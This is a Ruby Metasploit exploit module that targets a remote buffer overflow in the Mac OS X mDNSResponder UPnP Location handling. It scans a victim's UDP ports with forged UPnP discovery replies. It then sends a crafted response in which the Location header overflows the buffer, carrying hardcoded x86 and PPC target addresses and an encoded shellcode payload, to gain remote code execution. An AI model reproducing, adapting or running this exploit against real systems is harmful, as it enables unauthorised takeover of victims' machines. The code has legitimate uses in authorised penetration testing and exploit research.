require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
  include Exploit::Remote::Udp

  def initialize(info = {})
    super(update_info(info,
      'Name' => 'Mac OS X mDNSResponder UPnP Location Overflow',
      'Platform' => 'osx',
      'DefaultOptions' => { 
        'SRVPORT' => 1900,
        'RPORT' => 0
      },
      'Targets' => [
        [ '10.4.8 x86', { # mDNSResponder-108.2
          'Arch'                   => ARCH_X86,

          # Offset to mDNSStorage structure
          'Offset'                 => 21000,
          'Magic'                  => 0x8fe510a0,
          'g_szRouterHostPortDesc' => 0x53dc0,
          }
        ],
        [ '10.4.0 PPC', { # mDNSResponder-107
          'Arch'    => ARCH_PPC,
          'Offset'  => 21000,
          'Magic'   => 0x8fe51f4c,
          'Ret'     => 0x8fe41af8,
          }
        ],
      ],
      'DefaultTarget' => 1,

      'Payload' => {
        'BadChars' => "\x00\x3a\x2f",
        'StackAdjustment' => 0,
        'Space' => 468
      }
    ))

    register_options([
      Opt::LHOST(),
      OptPort.new('SRVPORT', 
        [true, "The UPNP server port to listen on", 1900])
    ], self.class)
      
    @mutex = Mutex.new()
    @found_upnp_port = false
    @key_to_port = Hash.new()
    @upnp_port = 0
    @client_socket = nil
  end
  
  def check
    #
    # TODO: Listen on two service ports, one a single character
    # shorter than the other (i.e 1900 and 19000).  If the copy was
    # truncated by strlcpy, it will connect to the service listening
    # on the shorter port number.
    #
    upnp_port = scan_for_upnp_port()
    if (upnp_port > 0)
      return Exploit::CheckCode::Detected
    else
      return Exploit::CheckCode::Unsupported
    end
  end
  
  def upnp_server(server)
    client = server.accept()
    request = client.readline()
    if (request =~ /GET \/([\da-f]+).xml/)
      @mutex.synchronize { 
        @found_upnp_port = true
        @upnp_port = @key_to_port[$1]
        
        # Important: Keep the client connection open
        @client_socket = client
      }
    end
  end
  
  def scan_for_upnp_port
    @upnp_port = 0
    @found_upnp_port = false
    
    upnp_port = 0
    
    # XXX: Do this in a more Metasploit-y way
    server = TCPServer.open(1900)
    server_thread = Thread.new { self.upnp_server(server) }
    
    begin
      socket = Rex::Socket.create_udp
      
      upnp_location = 
        "http://" + datastore['LHOST'] + ":" + datastore['SRVPORT']
      
      puts "[*] Listening for UPNP requests on: #{upnp_location}"
      puts "[*] Sending UPNP Discovery replies..."
      
      i = 49152;
      while i < 65536 && @mutex.synchronize { @found_upnp_port == false }
        key = sprintf("%.2x%.2x%.2x%.2x%.2x",
                      rand(255), rand(255), rand(255), rand(255), rand(255))
        
        @mutex.synchronize { 
          @key_to_port[key] = i
        }
        
        upnp_reply =
          "HTTP/1.1 200 Ok\r\n" +
          "ST: urn:schemas-upnp-org:service:WANIPConnection:1\r\n" +
          "USN: uuid:7076436f-6e65-1063-8074-0017311c11d4\r\n" +
          "Location: #{upnp_location}/#{key}.xml\r\n\r\n"
        
        socket.sendto(upnp_reply, datastore['RHOST'], i)
        
        i += 1
      end
      
      @mutex.synchronize { 
        if (@found_upnp_port)
          upnp_port = @upnp_port
        end
      }
    ensure
      server.close
      server_thread.join
    end
    
    return upnp_port
  end
  
  def exploit
    #
    # It is very important that we scan for the upnp port.  We must
    # receive the TCP connection and hold it open, otherwise the
    # code path that uses the overwritten function pointer most
    # likely won't be used.  Holding this connection increases the
    # chance that the code path will be used dramatically.
    #
    upnp_port = scan_for_upnp_port()
    
    if upnp_port == 0
      raise "Could not find listening UPNP UDP socket"
    end
    
    datastore['RPORT'] = upnp_port
    
    socket = connect_udp()
    
    if (target['Arch'] == ARCH_X86)
      space = "A" * target['Offset']
      space[0, payload.encoded.length] = payload.encoded
      
      pattern = Rex::Text.pattern_create(47)
      pattern[20, 4] = [target['Magic']].pack('V')
      pattern[44, 3] = [target['g_szRouterHostPortDesc']].pack('V')[0..2]
      
      boom = space + pattern
      usn = ""
      
    elsif (target['Arch'] == ARCH_PPC)
      space = "A" * target['Offset']
      
      pattern = Rex::Text.pattern_create(48)
      pattern[20, 4] = [target['Magic']].pack('N')
      
      #
      # r26, r27, r30, r31 point to g_szUSN+556
      # Ret should be a branch to one of these registers
      # And we make sure to put our payload in the USN header
      #
      pattern[44, 4] = [target['Ret']].pack('N')
      
      boom = space + pattern
      
      #
      # Start payload at offset 556 within USN
      #
      usn = "A" * 556 + payload.encoded
    end
    
    upnp_reply =
      "HTTP/1.1 200 Ok\r\n" +
      "ST: urn:schemas-upnp-org:service:WANIPConnection:1\r\n" +
      "USN: #{usn}\r\n" +
      "Location: http://#{boom}\r\n\r\n"
    
    puts "[*] Sending evil UPNP response"
    socket.put(upnp_reply)
    
    puts "[*] Sleeping to give mDNSDaemonIdle() a chance to run"
    sleep(10)
    
    handler()
    disconnect_udp()
  end
end
